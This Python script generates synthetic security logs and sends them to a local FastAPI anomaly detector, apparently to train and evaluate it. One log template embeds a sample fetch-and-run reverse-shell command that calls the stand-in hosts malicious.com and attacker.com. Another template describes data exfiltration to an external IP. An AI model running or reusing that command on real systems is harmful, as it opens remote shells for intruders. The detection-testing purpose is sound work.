import requests
import json
from datetime import datetime, timedelta
import random
import time
import sys
import os

# Add the parent directory to the path to import main's LogEntry model if needed
# This is mainly for type hinting, the actual data format is defined here.
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# --- Configuration ---
FASTAPI_BASE_URL = "http://localhost:8001" # Ensure this matches your FastAPI port

# --- Log Entry Template ---
# This defines the structure for logs to be injected
LOG_TEMPLATES = {
    "normal_login": {
        "entity_id": "user_normal_{}",
        "log_content": "User {} logged in successfully from IP {}. Session ID: {}",
        "keywords": ["login", "successfully", "session"]
    },
    "normal_access": {
        "entity_id": "user_normal_{}",
        "log_content": "User {} accessed file /data/reports/{}.pdf. Access granted.",
        "keywords": ["accessed", "file", "report"]
    },
    "impersonation_attempt": { # Semantic anomaly
        "entity_id": "user_alice", # Target a specific user for impersonation
        "log_content": "SYSTEM ALERT: Unauthorized access attempt detected from IP {} on server {}. Failed login for root.",
        "keywords": ["unauthorized", "access", "alert", "root", "failed"]
    },
    "data_exfiltration": { # Semantic + keyword anomaly
        "entity_id": "service_backup_prod", # A service account
        "log_content": "Service account {} initiated large data transfer to external IP {} for file 'sensitive_customer_data.zip'.",
        "keywords": ["data", "transfer", "external", "sensitive"]
    },
    "unusual_time_activity": { # Time-based anomaly
        "entity_id": "user_bob",
        "log_content": "User {} performed administrative task: 'systemctl restart webserver' outside of business hours.",
        "keywords": ["administrative", "restart", "webserver"]
    },
    "long_malicious_command": { # Length + keyword anomaly
        "entity_id": "user_charlie",
        "log_content": "User {} executed complex command: 'curl -s http://malicious.com/payload.sh | bash -i >& /dev/tcp/attacker.com/4444 0>&1' which is highly suspicious.",
        "keywords": ["curl", "bash", "dev", "tcp", "suspicious"]
    }
}

def generate_log_entry(log_type: str, entity_suffix: int = 1, is_anomalous_true: bool = False) -> Dict[str, Any]:
    """Generates a synthetic log entry based on a template."""
    template = LOG_TEMPLATES.get(log_type)
    if not template:
        raise ValueError(f"Log type '{log_type}' not found in templates.")

    entity_id = template["entity_id"].format(entity_suffix)
    current_time = datetime.now().isoformat()
    random_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
    random_session_id = ''.join(random.choices('0123456789abcdef', k=16))
    random_file_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    random_server = f"server-{random.randint(1, 10)}"

    log_content = template["log_content"].format(
        entity_id, random_ip, random_session_id, random_file_name, random_server
    )

    return {
        "entity_id": entity_id,
        "timestamp": current_time,
        "log_content": log_content,
        "is_anomalous_true": is_anomalous_true # For auto-labeling in evaluation
    }

def inject_log(log_entry: Dict[str, Any]):
    """Sends a single log entry to the FastAPI /detect/anomaly endpoint."""
    url = f"{FASTAPI_BASE_URL}/detect/anomaly"
    # Remove is_anomalous_true as it's for internal evaluation, not the API model
    api_payload = {k: v for k, v in log_entry.items() if k != 'is_anomalous_true'}
    
    try:
        response = requests.post(url, json=api_payload)
        response.raise_for_status()
        result = response.json()
        print(f"Injected log for '{log_entry['entity_id']}' (Type: {log_entry.get('log_type', 'N/A')}):")
        print(f"  Content: '{log_entry['log_content'][:70]}...'")
        print(f"  API Response: is_anomalous={result['is_anomalous']}, confidence_score={result['confidence_score']:.2f}, reasons={result['reasons']}")
        # Optionally, verify the true label against prediction
        if result['is_anomalous'] != log_entry['is_anomalous_true']:
            print(f"  MISMATCH: True label was {log_entry['is_anomalous_true']} but model predicted {result['is_anomalous']}")
        print("-" * 50)
    except requests.exceptions.RequestException as e:
        print(f"Error injecting log: {e}")
        print(f"  Attempted URL: {url}")
        print(f"  Payload: {api_payload}")
        print("-" * 50)

def inject_poisoned_logs_cli():
    """CLI tool to inject various types of logs."""
    print("--- Log Injector CLI ---")
    print(f"Connecting to FastAPI at: {FASTAPI_BASE_URL}")
    print("\nAvailable log types:")
    for i, log_type in enumerate(LOG_TEMPLATES.keys()):
        print(f"{i+1}. {log_type}")
    print("\nChoose an option:")
    print("  1. Inject a single log")
    print("  2. Inject a batch of normal logs for training (e.g., for new entities)")
    print("  3. Inject a batch of specific anomaly type logs")
    print("  4. Inject mixed logs (normal + anomalies)")
    print("  5. Exit")

    while True:
        choice = input("\nEnter your choice (1-5): ")
        if choice == '1':
            try:
                log_type_choice = input(f"Enter log type number (1-{len(LOG_TEMPLATES)}): ")
                log_type_name = list(LOG_TEMPLATES.keys())[int(log_type_choice) - 1]
                entity_suffix = int(input("Enter entity suffix (e.g., 1 for user_normal_1): "))
                is_anomaly = input("Is this log truly anomalous? (y/n): ").lower() == 'y'
                log_entry = generate_log_entry(log_type_name, entity_suffix, is_anomaly)
                log_entry['log_type'] = log_type_name # Add for printing
                inject_log(log_entry)
            except (ValueError, IndexError):
                print("Invalid input. Please try again.")
            except Exception as e:
                print(f"An error occurred: {e}")

        elif choice == '2':
            try:
                num_logs = int(input("Number of normal logs to inject: "))
                entity_suffix_start = int(input("Starting entity suffix (e.g., 100 for user_normal_100): "))
                logs_to_send = []
                for i in range(num_logs):
                    log_type_name = random.choice(["normal_login", "normal_access"])
                    logs_to_send.append(generate_log_entry(log_type_name, entity_suffix_start + i))
                
                print(f"Sending {len(logs_to_send)} normal logs to /profile/learn...")
                response = requests.post(f"{FASTAPI_BASE_URL}/profile/learn", json=[{k: v for k, v in log.items() if k != 'is_anomalous_true'} for log in logs_to_send])
                response.raise_for_status()
                print(f"Batch training response: {response.json()}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending batch training logs: {e}")
            except ValueError:
                print("Invalid number. Please try again.")

        elif choice == '3':
            try:
                log_type_choice = input(f"Enter anomaly log type number (1-{len(LOG_TEMPLATES)}): ")
                log_type_name = list(LOG_TEMPLATES.keys())[int(log_type_choice) - 1]
                if "normal" in log_type_name:
                    print("Please choose an anomaly type (e.g., impersonation_attempt, data_exfiltration).")
                    continue
                num_logs = int(input(f"Number of '{log_type_name}' logs to inject: "))
                entity_suffix_start = int(input("Starting entity suffix (e.g., 10 for user_alice_10): "))
                for i in range(num_logs):
                    log_entry = generate_log_entry(log_type_name, entity_suffix_start + i, is_anomalous_true=True)
                    log_entry['log_type'] = log_type_name # Add for printing
                    inject_log(log_entry)
                    time.sleep(0.1) # Small delay
            except (ValueError, IndexError):
                print("Invalid input. Please try again.")
            except Exception as e:
                print(f"An error occurred: {e}")

        elif choice == '4':
            try:
                num_mixed_logs = int(input("Number of mixed logs to inject: "))
                for i in range(num_mixed_logs):
                    if random.random() < 0.8: # 80% normal logs
                        log_type_name = random.choice(["normal_login", "normal_access"])
                        is_anomaly = False
                        entity_suffix = random.randint(1, 5) # Use existing normal users
                    else: # 20% anomalous logs
                        log_type_name = random.choice([
                            "impersonation_attempt", "data_exfiltration", "unusual_time_activity", "long_malicious_command"
                        ])
                        is_anomaly = True
                        entity_suffix = random.randint(1, 5) # Can target existing users or new ones
                    
                    log_entry = generate_log_entry(log_type_name, entity_suffix, is_anomaly)
                    log_entry['log_type'] = log_type_name # Add for printing
                    inject_log(log_entry)
                    time.sleep(0.1) # Small delay
            except ValueError:
                print("Invalid number. Please try again.")
            except Exception as e:
                print(f"An error occurred: {e}")

        elif choice == '5':
            print("Exiting Log Injector.")
            break
        else:
            print("Invalid choice. Please enter a number between 1 and 5.")

if __name__ == "__main__":
    inject_poisoned_logs_cli()

